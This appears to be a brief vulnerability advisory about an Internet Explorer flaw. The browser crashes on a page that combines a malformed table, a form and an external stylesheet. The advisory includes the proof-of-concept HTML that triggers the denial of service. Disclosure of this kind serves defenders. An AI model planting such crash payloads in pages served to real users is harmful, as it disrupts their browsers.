A vulnerability identified in Internet Explorer may allow an attacker to cause the application to crash. The issue presents itself when the browser attempts to process an HTML page containing a table and loads a css style sheet from a file.

This issue could be exploited by a remote attacker to cause a denial of service condition in the browser.

<table>
<td>
<form class="quick">
<td>
</form>
</table>
<link rel="stylesheet" href="link.css">
